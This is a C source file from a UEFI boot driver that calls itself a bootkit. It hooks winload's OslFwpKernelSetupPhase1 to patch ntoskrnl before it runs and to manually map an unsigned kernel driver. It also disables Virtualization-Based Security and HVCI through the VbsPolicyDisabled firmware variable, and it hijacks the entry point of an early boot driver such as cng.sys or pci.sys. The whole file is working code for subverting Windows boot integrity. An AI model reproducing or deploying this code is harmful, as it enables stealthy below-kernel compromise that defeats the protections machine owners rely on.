/**
 * @file PatchWinload.c
 * @brief The winload stage: hook OslFwpKernelSetupPhase1, and from inside it patch and bind the
 *        kernel before it runs.
 *
 * WHY THIS HOOK AND NOT ANOTHER. OslFwpKernelSetupPhase1 is the last point at which the boot
 * loader still holds control and ntoskrnl.exe is ALREADY MAPPED at its final address. That
 * combination is what the whole design rests on: the kernel's exports can be resolved directly
 * out of the mapped image, so patching it and binding our driver's imports both complete with no
 * kernel API and no kernel-side loader stage.
 *
 * ⚠ THE HOOK RUNS IN WINLOAD'S PROTECTED-MODE CONTEXT. By then winload has installed its own page
 * tables, and firmware pointers -- gBS, gST, gRT, or any physical address obtained from ACPI --
 * are not mapped. Touching one hangs the machine at a black screen before Windows reaches its
 * boot spinner, with no output and no indication of the cause. Memory also cannot be allocated
 * there, which is why everything the hook needs is reserved earlier. Anything reached through a
 * firmware address belongs in the ExitBootServices callback instead, not here.
 */

#include "NexusBootDxe.h"
#include "NexusBootLocate.h"
#include "NexusLoaderBlock.h"
#include "MapNexusCore.h"
#include "../../Include/NexusCoreBoot.h"

#include <Library/BaseMemoryLib.h>

NEXUS_HOOK gOslFwpHook = { 0 };

/**
 * The vendor GUID and variable the boot loader consults for VBS policy. Published values, not
 * discovered ones: SecConfig.efi writes this variable and winload reads and deletes it.
 */
STATIC CONST EFI_GUID mVbsPolicyVendorGuid = {
	0x77fa9abd, 0x0359, 0x4d32, { 0xbd, 0x60, 0x28, 0xf4, 0xe7, 0x8f, 0x78, 0x4b }
};

STATIC CONST CHAR16 mVbsPolicyVariable[] = L"VbsPolicyDisabled";

/** Boot drivers whose entry point the autonomous trigger may hijack, best first. */
STATIC CONST CHAR16* CONST mHijackCandidates[] = {
	L"acpiex.sys", L"msisadrv.sys", L"cng.sys", L"pci.sys"
};


/**
 * Ask the boot loader to leave VBS disabled for this boot.
 *
 * VBS-off is a PRECONDITION for what follows rather than a feature of it: with VTL1 active, the
 * hypervisor rather than the kernel is the highest authority on the machine, HVCI's EPT
 * permissions refuse a manually mapped image regardless of any signature check, and securekernel
 * re-validates code integrity independently. Gated on configuration so that testing with VBS up
 * is a setting rather than a code change, and so the dependency is stated rather than implied.
 *
 * An existing variable with unexpected attributes is DELETED before the write. SetVariable
 * refuses to change the attributes of a variable that already exists, so without this a stale
 * entry left by other software would make every boot fail to apply the policy -- silently, since
 * the only symptom is VBS coming up.
 */
STATIC
EFI_STATUS
EFIAPI
WinloadRequestVbsOff(
	VOID
	)
{
	CONST UINT32 Wanted = EFI_VARIABLE_NON_VOLATILE | EFI_VARIABLE_BOOTSERVICE_ACCESS;
	CONST BOOLEAN Disabled = TRUE;

	UINT32 Attributes = 0;
	UINTN Size = 0;

	CONST EFI_STATUS Probe = gRT->GetVariable((CHAR16*)mVbsPolicyVariable,
											  (EFI_GUID*)&mVbsPolicyVendorGuid,
											  &Attributes, &Size, NULL);

	if (Probe != EFI_NOT_FOUND && (Attributes != Wanted || Size != sizeof(Disabled)))
	{
		gRT->SetVariable((CHAR16*)mVbsPolicyVariable, (EFI_GUID*)&mVbsPolicyVendorGuid,
						 0, 0, NULL);
	}

	return gRT->SetVariable((CHAR16*)mVbsPolicyVariable, (EFI_GUID*)&mVbsPolicyVendorGuid,
							Wanted, sizeof(Disabled), (VOID*)&Disabled);
}


/**
 * Arm the autonomous trigger by redirecting an early boot driver's entry point.
 *
 * Needed because the kernel makes no PASSIVE_LEVEL runtime-service call of its own after boot, so
 * a one-shot waiting on a runtime-service call would wait for a human. The window between the
 * kernel starting and our patches being live is exactly the interval that matters.
 *
 * A LIST rather than one name: the boot-driver set varies by SKU, chipset and Windows release. A
 * driver absent on some machine must fall through to the next candidate instead of losing the
 * trigger, because that failure has no local symptom -- the machine boots normally and the
 * trigger simply never arms.
 */
STATIC
VOID
EFIAPI
WinloadArmTrigger(
	IN CONST LIST_ENTRY* LoadOrderList
	)
{
	for (UINTN i = 0; i < ARRAY_SIZE(mHijackCandidates); ++i)
	{
		CONST PKLDR_DATA_TABLE_ENTRY Target =
			NexusFindBootModule(LoadOrderList, mHijackCandidates[i]);
		if (Target == NULL || Target->EntryPoint == NULL)
			continue;

		if (!EFI_ERROR(NexusCoreArmEntryHijack(&Target->EntryPoint, Target->EntryPoint)))
		{
			PRINT_KERNEL_PATCH_MSG(L"[winload] trigger armed on %s (original entry 0x%llX)\r\n",
								   mHijackCandidates[i], (UINT64)(UINTN)Target->EntryPoint);
			return;
		}
	}

	PRINT_KERNEL_PATCH_MSG(L"[winload] trigger NOT armed -- no candidate driver was present.\r\n");
}


EFI_STATUS
EFIAPI
HookedOslFwpKernelSetupPhase1(
	IN PLOADER_PARAMETER_BLOCK LoaderBlock
	)
{
	//
	// Put the original bytes back first. Everything below may fail, and the tail call at the end
	// must reach the real function whatever happened in between.
	//
	NexusHookRestore(&gOslFwpHook);

	CONST LIST_ENTRY* CONST LoadOrderList = (CONST LIST_ENTRY*)&LoaderBlock->LoadOrderListHead;
	CONST PKLDR_DATA_TABLE_ENTRY KernelEntry = NexusFindBootModule(LoadOrderList, L"ntoskrnl.exe");

	if (KernelEntry == NULL || KernelEntry->DllBase == NULL || KernelEntry->SizeOfImage == 0)
	{
		gKernelPatchInfo.Status = EFI_LOAD_ERROR;
		PRINT_KERNEL_PATCH_MSG(L"[winload] ntoskrnl.exe not found in the load-order list.\r\n");
		NexusCoreSetRefusalLine(NXC_DXE_REFUSAL(NXC_DXE_FILE_WINLOAD, __LINE__));
		goto Resume;
	}

	VOID* CONST KernelBase = KernelEntry->DllBase;
	CONST PEFI_IMAGE_NT_HEADERS NtHeaders =
		RtlpImageNtHeaderEx(KernelBase, (UINTN)KernelEntry->SizeOfImage);
	if (NtHeaders == NULL)
	{
		gKernelPatchInfo.Status = EFI_NOT_FOUND;
		PRINT_KERNEL_PATCH_MSG(L"[winload] kernel image at 0x%p is not a valid PE.\r\n", KernelBase);
		NexusCoreSetRefusalLine(NXC_DXE_REFUSAL(NXC_DXE_FILE_WINLOAD, __LINE__));
		goto Resume;
	}

	gKernelPatchInfo.KernelBase = KernelBase;
	gKernelPatchInfo.Status = PatchNtoskrnl(KernelBase, NtHeaders);

	//
	// Record the outcome where it OUTLIVES THE BOOT SCREEN. The console scrolls away seconds
	// later, and binding proceeds regardless -- deliberately, since the manual map does not
	// depend on the kernel patch -- so without this a failed patch produced a system reporting
	// itself healthy with the patch simply not applied.
	//
	// EVALUATED carries no verdict and is unconditional: it proves only that this DXE asks. A
	// clear PATCHED bit would otherwise be indistinguishable from a DXE too old to set it.
	//
	NexusCoreSetBootFlag(NXC_BOOTFLAG_KERNEL_PATCH_EVALUATED);
	if (!EFI_ERROR(gKernelPatchInfo.Status))
		NexusCoreSetBootFlag(NXC_BOOTFLAG_KERNEL_PATCHED);

	//
	// Bind the driver. Pure computation over memory reserved at DXE entry -- no allocation, which
	// is impossible here.
	//
	// NOT FATAL. A failure must leave the machine booting normally: the status goes to the boot
	// block for the usermode reader, the entry stays NULL so the trigger never fires, and Windows
	// starts as usual. A bootkit that bricks the boot is worse than one that did not load.
	//
	{
		VOID* Entry = NULL;
		CONST EFI_STATUS BindStatus = NexusCoreBind((UINT8*)KernelBase, NtHeaders, &Entry);

		if (EFI_ERROR(BindStatus))
		{
			PRINT_KERNEL_PATCH_MSG(L"[winload] core bind FAILED: 0x%llX\r\n", (UINT64)BindStatus);
		}
		else
		{
			PRINT_KERNEL_PATCH_MSG(L"[winload] core bound, entry at 0x%llX\r\n",
								   (UINT64)(UINTN)Entry);
			WinloadArmTrigger(LoadOrderList);
		}
	}

Resume:
	//
	// No error handling here, and few options if there were: the ExitBootServices callback reads
	// the patch status and is where the user is told.
	//
	return ((t_OslFwpKernelSetupPhase1)gOslFwpHook.Target)(LoaderBlock);
}


/**
 * Resolve the boot loader's debug printer, so the hook above has somewhere to print.
 *
 * Optional by design -- its absence costs debugger output and nothing else.
 */
STATIC
VOID
EFIAPI
WinloadBindPrinter(
	IN CONST VOID* ImageBase,
	IN PEFI_IMAGE_NT_HEADERS NtHeaders
	)
{
	CONST NEXUS_BOOT_PRINT Printer =
		(NEXUS_BOOT_PRINT)GetProcedureAddress((UINTN)ImageBase, NtHeaders, "BlStatusPrint");

	if (!NexusBootPrintSetTarget(Printer))
		Print(L"\r\nNOTE: winload does not export BlStatusPrint. No boot debugger output.\r\n");
}


EFI_STATUS
EFIAPI
PatchWinload(
	IN CONST VOID* ImageBase,
	IN PEFI_IMAGE_NT_HEADERS NtHeaders
	)
{
	UINT16 Major = 0, Minor = 0, Build = 0, Revision = 0;
	EFI_STATUS Status = GetPeFileVersionInfo(ImageBase, &Major, &Minor, &Build, &Revision, NULL);

	//
	// FAIL CLOSED ON AN UNREADABLE VERSION. Never patch an image whose version cannot be
	// established: the version selects real behaviour, and a parse failure that fell through
	// would leave the build number at zero, which compares BELOW every floor rather than above.
	//
	if (EFI_ERROR(Status))
	{
		Print(L"\r\nPatchWinload: cannot read winload version info (%r).\r\n"
			L"Refusing to patch an image whose version is unknown.\r\n", Status);
		NexusCoreSetRefusalLine(NXC_DXE_REFUSAL(NXC_DXE_FILE_WINLOAD, __LINE__));
		goto Finish;
	}

	Print(L"\r\nPatching winload.efi v%u.%u.%u.%u...\r\n", Major, Minor, Build, Revision);

	if (Build < NEXUS_MIN_SUPPORTED_BUILD)
	{
		Print(L"\r\nPatchWinload: unsupported winload build %u.\r\n"
			L"This driver targets build %u and newer only.\r\n",
			Build, (UINT32)NEXUS_MIN_SUPPORTED_BUILD);
		Status = EFI_UNSUPPORTED;
		NexusCoreSetRefusalLine(NXC_DXE_REFUSAL(NXC_DXE_FILE_WINLOAD, __LINE__));
		goto Finish;
	}

	if (NexusPeFindSection(NtHeaders, ".text") == NULL)
	{
		Print(L"\r\nPatchWinload: winload has no .text section.\r\n");
		Status = EFI_NOT_FOUND;
		NexusCoreSetRefusalLine(NXC_DXE_REFUSAL(NXC_DXE_FILE_WINLOAD, __LINE__));
		goto Finish;
	}

	WinloadBindPrinter(ImageBase, NtHeaders);

	if (gDriverConfig.DisableVbs)
	{
		if (EFI_ERROR(WinloadRequestVbsOff()))
			Print(L"\r\nWARNING: could not write \"%ls\". VBS may come up this boot.\r\n",
				mVbsPolicyVariable);
	}
	else
	{
		Print(L"\r\nNOTE: leaving VBS policy alone (DisableVbs=FALSE). If VBS/HVCI comes up,\r\n"
			L"unsigned kernel code cannot load and the manual map will not complete.\r\n");
	}

	//
	// FAIL CLOSED. There is no second method of locating this function, and a wrong address here
	// would place an inline hook at an arbitrary point inside winload.
	//
	UINT8* Target = NULL;
	Status = NexusBootLocateOslFwpKernelSetupPhase1(ImageBase, NtHeaders, &Target);
	if (EFI_ERROR(Status))
	{
		Print(L"\r\nPatchWinload: could not locate OslFwpKernelSetupPhase1 (%r).\r\n", Status);
		NexusCoreSetRefusalLine(NXC_DXE_REFUSAL(NXC_DXE_FILE_WINLOAD, __LINE__));
		goto Finish;
	}

	Print(L"Found OslFwpKernelSetupPhase1 at 0x%llX, detour at 0x%p.\r\n",
		(UINTN)Target, (VOID*)&HookedOslFwpKernelSetupPhase1);

	Status = NexusHookInstall(&gOslFwpHook, Target, (VOID*)&HookedOslFwpKernelSetupPhase1);
	if (EFI_ERROR(Status))
	{
		Print(L"\r\nPatchWinload: hook install failed (%r).\r\n", Status);
		NexusCoreSetRefusalLine(NXC_DXE_REFUSAL(NXC_DXE_FILE_WINLOAD, __LINE__));
		goto Finish;
	}

Finish:
	if (EFI_ERROR(Status))
	{
		Print(L"\r\nPress any key to continue anyway, or press ESC to reboot.\r\n");
		if (!WaitForKey())
			gRT->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
	}
	else
	{
		Print(L"Successfully patched winload!OslFwpKernelSetupPhase1.\r\n");

		//
		// Durable, because that Print was the only evidence the patch applied and it scrolls past
		// during boot. Afterwards "refused" and "applied but the hook never fired" have different
		// suspects and were indistinguishable from the status read.
		//
		NexusCoreSetBootFlag(NXC_BOOTFLAG_WINLOAD_PATCHED);
		RtlSleep(2000);

		if (gDriverConfig.WaitForKeyPress)
		{
			Print(L"\r\nPress any key to continue.\r\n");
			WaitForKey();
		}
	}

	//
	// SUCCESS EITHER WAY. A refusal above already asked the user, and they chose to continue --
	// returning an error here would reboot a machine whose owner just said not to.
	//
	return EFI_SUCCESS;
}
